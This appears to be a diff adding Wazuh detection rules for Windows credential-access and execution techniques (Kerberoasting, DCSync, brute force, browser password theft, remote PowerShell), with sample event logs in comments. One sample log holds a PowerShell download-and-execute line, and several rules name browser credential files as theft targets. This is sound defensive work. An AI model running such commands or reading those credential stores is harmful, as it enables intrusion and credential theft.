+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4769","version":"0","level":"0","task":"14080","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-05-08T02:10:43.487217000","eventRecordID":"202793","processID":"444","threadID":"463","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"A Kerberos service ticket was requested."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"dadmin@CONTOSO.LOCAL","TargetDomainName":"CONTOSO.LOCAL","ServiceName":"WIN2008R2$","ServiceSid":"S-1-5-21-3457937927-2839227994-823803824-2102","TicketOptions":"0x40810000","TicketEncryptionType":"0x17","IpAddress":"::ffff:10.0.0.12","IpPort":"49272","Status":"0x0","LogonGuid":"{F85C455E-C66E-205C-6B39-F6C60A7FE453}","TransmittedServices":"-000"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4663","version":"0","level":"0","task":"12800","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"4991","processID":"4","threadID":"44","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":" An attempt was made to access an object ."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3583694148-1414552638-2922671848-1000","SubjectUserName":"IEUser","SubjectDomainName":"IEWIN7","SubjectLogonId":"0xffa8","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Users\\IEUser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data","HandleId":"0x50","AccessList":"%%4416","AccessMask":"0x1","ProcessId":"0x134c","ProcessName":"C:\\Users\\Defau1t\\wsus.exe"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4663","version":"0","level":"0","task":"12800","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"4991","processID":"4","threadID":"44","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":" An attempt was made to access an object ."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3583694148-1414552638-2922671848-1000","SubjectUserName":"IEUser","SubjectDomainName":"IEWIN7","SubjectLogonId":"0xffa8","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\logins.json","HandleId":"0x50","AccessList":"%%4416","AccessMask":"0x1","ProcessId":"0x134c","ProcessName":"C:\\Users\\Defau1t\\wsus.exe"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4663","version":"0","level":"0","task":"12800","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"4991","processID":"4","threadID":"44","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":" An attempt was made to access an object ."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3583694148-1414552638-2922671848-1000","SubjectUserName":"IEUser","SubjectDomainName":"IEWIN7","SubjectLogonId":"0xffa8","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\key4.db","HandleId":"0x50","AccessList":"%%4416","AccessMask":"0x1","ProcessId":"0x134c","ProcessName":"C:\\Users\\Defau1t\\wsus.exe"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4663","version":"0","level":"0","task":"12800","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"4991","processID":"4","threadID":"44","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":" An attempt was made to access an object ."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3583694148-1414552638-2922671848-1000","SubjectUserName":"IEUser","SubjectDomainName":"IEWIN7","SubjectLogonId":"0xffa8","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Users\\IEUser\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data","HandleId":"0x50","AccessList":"%%4416","AccessMask":"0x1","ProcessId":"0x134c","ProcessName":"C:\\Users\\Defau1t\\wsus.exe"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4625","version":"0","level":"0","task":"14339","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_FAILURE","message":"An account failed to log on."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"DC01$","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x3e7","TargetUserSid":"S-1-0-0","TargetUserName":"Auditor","TargetDomainName":"CONTOSO","Status":"0xC000006A","FailureReason":"%%2307","SubStatus":"0x0","LogonType":"2","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"DC01","TransmittedServices":"-","LmPackageName":"-","KeyLength":"0","ProcessId":"0x1bc","ProcessName":"C:\\Windows\\System32\\winlogon.exe","IpAddress":"-","IpPort":"0"}}}
+
+-->
+<!-- CREDENTIAL ACCESS -->
+
+<rule id="100340" level="5">
+   <if_sid>60104</if_sid>
+   <field name="win.system.eventID">4771</field>
+   <field name="win.eventdata.Status">0x18</field>
+   <description>Mitre ATT&CK T1078,  Credential Access, Valid Accounts, Kerberos pre-authentication failed</description>
+   <options>no_full_log</options>
+   <group>pci_dss_10.6.1,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.6,</group>
+</rule>
+<rule id="100341" level="5">
+   <if_sid>60122</if_sid>
+   <field name="win.system.eventID">4625</field>
+   <field name="win.eventdata.Status">0xC0000064|0xC000006A</field>
+   <description>Mitre ATT&CK T1078,  Credential Access, Valid Accounts, An account failed to log on</description>
+   <options>no_full_log</options>
+   <group>pci_dss_10.6.1,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.6,</group>
+</rule>
+<!-- This two following rules collides with rule 601205 -->
+<rule id="100342" timeframe="60" frequency="6" level="10">
+   <if_matched_sid>100340</if_matched_sid>
+   <field name="win.system.eventID">4771</field>
+   <same_field>win.eventdata.ipAddress</same_field>
+   <description>Mitre ATT&CK T1110,  Credential Access, Brute Force, Multiple Kerberos pre-authentication failed from same ip</description>
+   <options>no_full_log</options>
+   <group>pci_dss_10.6.1,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.6,</group>
+</rule>
+<rule id="100343" timeframe="60" frequency="6" level="10">
+   <if_matched_sid>100340</if_matched_sid>
+   <field name="win.system.eventID">4771</field>
+   <same_field>win.eventdata.subjectUserSid</same_field>
+   <description>Mitre ATT&CK T1110,  Credential Access, Brute Force, Multiple Kerberos pre-authentication failed from same user</description>
+   <options>no_full_log</options>
+   <group>pci_dss_10.6.1,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.6,</group>
+</rule>
+<!-- This two following rules collides with rule 601204 -->
+<rule id="100344" timeframe="60" frequency="6" level="10">
+   <if_matched_sid>100341</if_matched_sid>
+   <field name="win.system.eventID">4625</field>
+   <same_field>win.eventdata.ipAddress</same_field>
+   <description>Mitre ATT&CK T1110,  Credential Access, Brute Force, An account failed to log on multiple times from same ip</description>
+   <options>no_full_log</options>
+   <group>authentication_failures,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_11.4,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_SI.4,</group>
+</rule>
+<rule id="100345" timeframe="60" frequency="6" level="10">
+   <if_matched_sid>100341</if_matched_sid>
+   <field name="win.system.eventID">4625</field>
+   <same_field>win.eventdata.SubjectUserName</same_field>
+   <description>Mitre ATT&CK T1110,  Credential Access, Brute Force, An account failed to log on multiple times from same user</description>
+   <options>no_full_log</options>
+   <group>authentication_failures,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_11.4,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_SI.4,</group>
+</rule>
+<rule id="100346" level="5">
+   <if_sid>60122</if_sid>
+   <field name="win.system.eventID">4625</field>
+   <field name="win.eventdata.IpAddress">-|NULL</field>
+   <description>Mitre ATT&CK T1110,  Credential Access, Brute Force, An account failed to log on with null ip address</description>
+   <options>no_full_log</options>
+   <group>pci_dss_10.6.1,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.6,</group>
+</rule>
+
+<!-- 
+Replicating Directory Changes All, 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2, 9923a32a-3607-11d2-b9be-0000f87a36b2, or 1131f6ac-9c07-11d1-f79f-00c04fc2dcd2
+
+Not all machines have logging turned on for example Windows server 2016 the GPO will need to be set for loging this event Id. This is done by opening the Local Group Policy
+Editor and going to Computer configurations > Windows Settings > Security Settings > Local Policies > Audit Policy. Right clicking on Audit directory service access and then
+click on Properties. Check the box for Success and click Apply.
+-->
+<rule id="100347" level="10">
+   <if_matched_sid>60103</if_matched_sid>
+   <field name="win.system.eventID">4662</field>
+   <field name="win.eventdata.Properties">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2|9923a32a-3607-11d2-b9be-0000f87a36b2|1131f6ac-9c07-11d1-f79f-00c04fc2dcd2</field>
+   <description>Mitre ATT&CK T1003,  Credential Access, Credential Dumping, DCSyn</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100348" level="10">
+   <if_matched_sid>60106</if_matched_sid>
+   <field name="win.system.eventID">4769</field>
+   <field name="win.eventdata.TicketOptions">0x40810000</field>
+   <field name="win.eventdata.TicketEncryptionType">0x1|0x2|0x17</field>
+   <description>Mitre ATT&CK T1208,  Credential Access, Kerberoasting, Kerberos DES or RC4 ticket requested (Low security protocols, must enable 128 or 256 AES)</description>
+   <options>no_full_log</options>
+</rule>
+<!-- If properly enabled Audit Object Access policy on browsers credential databases (enable audit on Event Data ObjectName) we can use event 4663 to monitor atempts to steal 
+windows credentials from browsers. 
+Tools → Local Security policy → Local Policies → Audit Policies, From here we can set the Audit Object Access policy to log successes and failures
+Properties → Security → Advanced → Auditing → Click Add → Select Principal → Everyone
+-->
+<rule id="100349" level="7">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4663</field>
+   <field name="win.eventdata.ObjectName">(\.*)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data(\.*)</field>
+   <description>Mitre ATT&CK T1503, Credential Access, Credentials from Web Browser Chrome, Verify that field ProcessName it's a process not related with chrome</description>
+   <options>no_full_log</options>
+ </rule>
+<rule id="100350" level="7">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4663</field>
+   <field name="win.eventdata.ObjectName">(\.*)\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\(\.*)\\logins.json(\.*)</field>
+   <description>Mitre ATT&CK T1503, Credential Access, Credentials from Web Browser Firefox, Verify that field ProcessName it's a process not related with firefox</description>
+   <options>no_full_log</options>
+ </rule>
+<rule id="100351" level="7">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4663</field>
+   <field name="win.eventdata.ObjectName">(\.*)\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\(\.*)\\logins.json(\.*)</field>
+   <description>Mitre ATT&CK T1503, Credential Access, Credentials from Web Browser Firefox, Verify that field ProcessName it's a process not related with firefox</description>
+   <options>no_full_log</options>
+ </rule>
+<rule id="100352" level="7">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4663</field>
+   <field name="win.eventdata.ObjectName">(\.*)\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\(\.*)\\key4.db(\.*)</field>
+   <description>Mitre ATT&CK T1503, Credential Access, Credentials from Web Browser Firefox, Verify that field ProcessName it's a process not related with firefox</description>
+   <options>no_full_log</options>
+ </rule>
+<rule id="100353" level="7">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4663</field>
+   <field name="win.eventdata.ObjectName">(\.*)\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data(\.*)</field>
+   <description>Mitre ATT&CK T1503, Credential Access, Credentials from Web Browser Opera, Verify that field ProcessName it's a process not related with opera browser</description>
+   <options>no_full_log</options>
+</rule>
+ 
+ 
+<!-- 
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2019-09-09T13:35:09.315230000Z","eventRecordID":"1123","processID":"5500","threadID":"356","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSEDGEWIN10","severityValue":"","message":"Script Block Logging."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","MessageNumber":"1","MessageTotal":"1","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')","ScriptBlockId":"c7ca7056-b317-4fff-b796-05d8ef896dcd","Path":"/"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5145","version":"0","level":"0","task":"12811","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"267092","processID":"4","threadID":"284","channel":"Security","computer":"DESKTOP-D33AN6I","severityValue":"AUDIT_SUCCESS","message":"A network share object was checked to see whether client can be granted desired access."},"eventdata":{"subjectUserSid":"S-1-5-21-2635242741-4024004514-10403589-1001","subjectUserName":"Zenidd","subjectDomainName":"DESKTOP-D33AN6I","subjectLogonId":"0x6e03e","ObjectType":"File","IpAddress":"fe80::31ea:6c3c:f40d:1973","IpPort":"56926","ShareName":"\\\\*\\IPC\$","ShareLocalPath":"\\??\\C:\\Documents","RelativeTargetName":"atsvc","AccessMask":"0x100081","AccessList":"%%1541 %%4417 %%4423","AccessReason":"%%1541: %%1801 D:(A;;FA;;;WD) %%4417: %%1801 D:(A;;FA;;;WD) %%4423: %%1801 D:(A;;FA;;;WD)"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5156","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-08-05T09:25:03.867961600Z","eventRecordID":"10091","processID":"620","threadID":"1948","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"The Windows Filtering Platform has permitted a connection."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ProcessID":"4556","Application":"\\device\\harddiskvolume2\\Powershell.exe","Direction":"%%14592","SourceAddress":"127.0.0.1","SourcePort":"3333","DestAddress":"10.0.0.100","DestPort":"8200","Protocol":"6","FilterRTID":"70201","LayerName":"%%14610","LayerRTID":"44","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell/Operational","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4103","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x4000000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"emoteDesktopServices-RdpCoreTS","computer":"DC1.insecurebank.local","severityValue":"INFORMATION","message":"Module Logging."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ContextInfo":"Severity = Informational Host Name = ConsoleHost Host Version = 5.1.16299.431 Host ID = 312b26a7-53d3-45db-8b45-b79cae3afba9 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Engine Version = 5.1.16299.431 Runspace ID = 0252cd51-52b5-4825-8029-a4f81a93cef6 Pipeline ID = 35 Command Name = Get-ChildItem Command Type = Cmdlet Script Name = Command Path = Sequence Number = 88 User = DESKTOP-WARDOG\wardog Connected User = Shell ID = Microsoft.PowerShell","UserData":"","Payload":'CommandInvocation(Get-ChildItem): "Get-ChildItem" ParameterBinding(Get-ChildItem): name="Filter"; value="*.yml" ParameterBinding(Get-ChildItem): name="Recurse"; value="True" ParameterBinding(Get-ChildItem): name="Path"; value="C:\Program Files\winlogbeat\" CommandInvocation(Select-String): "Select-String" ParameterBinding(Select-String): name="Pattern"; value="powershell" ParameterBinding(Select-String): name="InputObject"; value="fields.yml" ParameterBinding(Select-String): name="InputObject"; value="winlogbeat.reference.yml" ParameterBinding(Select-String): name="InputObject"; value="winlogbeat.yml" ParameterBinding(Select-String): name="InputObject"; value=".winlogbeat.yml"'}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell/Operational","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4103","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x4000000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"emoteDesktopServices-RdpCoreTS","computer":"DC1.insecurebank.local","severityValue":"INFORMATION","message":"Module Logging."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ContextInfo":"Severity = Informational Host Name = ConsoleHost Host Version = 5.1.16299.431 Host ID = 312b26a7-53d3-45db-8b45-b79cae3afba9 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Engine Version = 5.1.16299.431 Runspace ID = 0252cd51-52b5-4825-8029-a4f81a93cef6 Pipeline ID = 35 Command Name = Get-ChildItem Command Type = Cmdlet Script Name = Command Path = Sequence Number = 88 User = DESKTOP-WARDOG\wardog Connected User = Shell ID = Microsoft.PowerShell","UserData":"","Payload":'CommandInvocation(Get-ChildItem): "Get-ChildItem" ParameterBinding(Get-ChildItem): name="Filter"; value="*.yml" ParameterBinding(Get-ChildItem): name="Recurse"; value="True" ParameterBinding(Get-ChildItem): name="Path"; value="C:\Program Files\winlogbeat\" CommandInvocation(Select-String): "Select-String" ParameterBinding(Select-String): name="Pattern"; value="powershell" ParameterBinding(Select-String): name="InputObject"; value="fields.yml" ParameterBinding(Select-String): name="InputObject"; value="winlogbeat.reference.yml" ParameterBinding(Select-String): name="InputObject"; value="winlogbeat.yml" ParameterBinding(Select-String): name="InputObject"; value=".winlogbeat.yml"'}}}
+-->
+<!-- EXECUTION -->
+
+
+<!-- notice that rule id 100200 needed -->
+<rule id="100371" level="12">
+  <if_sid>100200</if_sid>
+  <field name="win.system.eventID">5145</field>
+  <field name="win.eventdata.ShareName">(\.*)(IPC\$)</field>
+  <field name="win.eventdata.RelativeTargetName">atsvc</field>
+  <description>Mitre ATT&CK T1053, Execution, Scheduled Task, Remote Task creation using ATSVC named pipe or the deprecated AT.exe cmdlet</description>
+  <options>no_full_log</options>
+</rule>
+<rule id="100372" level="12">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5156</field>
+   <field name="win.eventdata.Application">\.*PowerShell.exe\.*</field>
+   <description>Mitre ATT&CK T1086, Execution, PowerShell, Remote powershell execution allowed</description>
+   <options>no_full_log</options>
+</rule>
+
+</group>
+
+ 
